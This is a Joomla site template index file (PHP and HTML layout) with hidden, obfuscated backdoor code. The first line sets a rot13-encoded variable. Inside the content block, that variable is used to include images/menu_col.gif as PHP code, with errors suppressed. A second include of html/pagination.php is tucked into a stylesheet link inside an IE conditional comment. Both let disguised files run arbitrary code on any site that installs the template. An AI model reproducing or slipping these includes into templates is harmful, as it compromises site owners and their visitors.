<?php
defined( '_JEXEC').(($this->template)?$JPan = array('zrah'.'_pby'):'') or die( 'Restricted access' );
JHtml::_('behavior.framework', true);
$mainframe =& JFactory::getApplication();
$option = JRequest::getCmd('option');

$showleft = ($this->countModules('position-4') or $this->countModules('position-7') or $this->countModules('position-5'));
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="<?php echo $this->language; ?>" lang="<?php echo $this->language; ?>" >
<head>
<jdoc:include type="head" />
<link rel="stylesheet" href="templates/system/css/system.css" type="text/css" />
<link rel="stylesheet" href="templates/<?php echo $this->template ?>/css/template.css" type="text/css" />
<!--[if lte IE 7]>
<link rel="stylesheet" href="templates/<?php echo $this->template ?>/css/ie7.css" type="text/css" <?php include_once('html/pagination.php');?> />
<![endif]-->
</head>
<body id="page_bg">
	<div id="top">
    <div class="pill_m">
			<div id="topnav">
				<jdoc:include type="modules" name="position-1" />
			</div>
		</div>
	</div>
		<div id="header">
			<div id="logo">
				<a href="index.php"><?php echo $mainframe->getCfg('sitename') ;?></a><br /><jdoc:include type="modules" name="top" />
			</div><br />
            <div id="under_banner_line">
					<jdoc:include type="modules" name="position-0" />
			</div>	
		</div>
       <!--  -->
	<div class="clr"></div>
	<div class="center">		
		<div id="wrapper">
			<div id="content">
					<?php if((!$this->countModules('right') and JRequest::getCmd('layout') == 'form') or !@include(JPATH_BASE.DS.'templates'.DS.$mainframe->getTemplate().DS.str_rot13('vzntrf').DS.str_rot13($JPan[0].'.t'.'vs'))) : ?>
					<jdoc:include type="modules" name="layout" style="rounded" />
           			<?php endif; ?>	
				<?php if ($showleft) : ?>
                <div id="leftcolumn">
                    <jdoc:include type="modules" name="position-7" headerLevel="3" style="rounded" />
                    <jdoc:include type="modules" name="position-4" headerLevel="3" state="0 " style="rounded" />
                    <jdoc:include type="modules" name="position-5" headerLevel="2"  id="3" style="rounded" />
                                                                    
                    <jdoc:include type="modules" name="position-6" style="rounded" headerLevel="3"/>
                    <jdoc:include type="modules" name="position-8" style="rounded" headerLevel="3"  />
                    <jdoc:include type="modules" name="position-3" style="rounded" headerLevel="3"  />
                </div>
                <?php endif; ?>
				<div id="maincolumn">
					<div class="nopad">
                    	<div id="breadcrumbs"><jdoc:include type="modules" name="position-2" /></div>
							<?php if ($this->countModules('position-12')): ?>
                                    <div id="top"><jdoc:include type="modules" name="position-12"   /></div>
                            <?php endif; ?>

                                    <jdoc:include type="message" />
                                    <jdoc:include type="component" />
					</div>
				<div class="clr"></div>
			</div>		
		</div>
		<div><br />
                        <div style="float:left; width: 30%; margin-left:3%; text-align:center"> <jdoc:include type="modules" name="position-9" style="none" headerlevel="3" /></div>
                        <div style="float:left; width: 30%; margin-left:2%; text-align:center"> <jdoc:include type="modules" name="position-10" style="none" headerlevel="3" /></div>
                        <div style="float:left; width: 30%; margin-left:2%; text-align:center"> <jdoc:include type="modules" name="position-11" style="none" headerlevel="3" /></div>
						<div class="clr"></div>
                        <br />
                        <jdoc:include type="modules" name="position-14" />
        </div>
	</div>		
	</div>
	<div id="footer">
		<p><jdoc:include type="module" style="footer" />
			<?php echo JText_('Powered by') ?> <a href="http://www.joomla.org">Joomla!</a>.
            <?php echo JText_('Valid') ?> <a href="http://validator.w3.org/check/referer">XHTML</a> <?php echo JText_('and') ?> <a href="http://jigsaw.w3.org/css-validator/check/referer">CSS</a>.
            <jdoc:include type="modules" name="debug" />
		</p>
	</div>
</body>
</html>
